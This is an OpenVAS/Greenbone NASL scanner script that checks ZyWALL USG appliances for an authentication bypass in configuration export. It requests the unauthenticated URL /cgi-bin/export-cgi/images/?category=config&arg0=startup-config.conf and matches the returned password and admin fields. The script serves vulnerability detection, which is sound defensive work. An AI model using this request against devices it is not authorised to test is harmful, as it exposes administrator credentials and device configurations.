# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103161");
  script_version("2023-07-28T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-07-28 05:05:23 +0000 (Fri, 28 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-05-12 13:24:44 +0200 (Thu, 12 May 2011)");
  script_tag(name:"cvss_base", value:"2.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:N/I:P/A:N");

  script_name("Multiple ZyWALL USG Products Remote Security Bypass Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/47707");
  script_xref(name:"URL", value:"http://www.redteam-pentesting.de/en/advisories/rt-sa-2011-003/-authentication-bypass-in-configuration-import-and-export-of-zyxel-zywall-usg-appliances");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 443);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Reportedly, the issue is fixed. However, Symantec has not confirmed
  this. Please contact the vendor for more information.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"Multiple ZyWALL USG products are prone to a security-bypass
  vulnerability.

  Note: Reportedly, the firmware is also prone to a weakness that allows
  password-protected upgrade files to be decrypted with a known plaintext attack.");

  script_tag(name:"impact", value:"Successful exploits may allow attackers to bypass certain security
  restrictions and perform unauthorized actions.");

  script_tag(name:"affected", value:"ZyWALL USG-20 ZyWALL USG-20W ZyWALL USG-50 ZyWALL USG-100 ZyWALL USG-
  200 ZyWALL USG-300 ZyWALL USG-1000 ZyWALL USG-1050 ZyWALL USG-2000");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("host_details.inc");

port = http_get_port(default:443);

url = string("/");

if(http_vuln_check(port:port, url:url, pattern:"<title>ZyWALL USG", usecache:TRUE)) {

  url = string("/cgi-bin/export-cgi/images/?category=config&arg0=startup-config.conf");
  if(http_vuln_check(port:port, url:url, pattern:"model: ZyWALL USG", extra_check:make_list("password","interface","user-type admin"))) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(0);
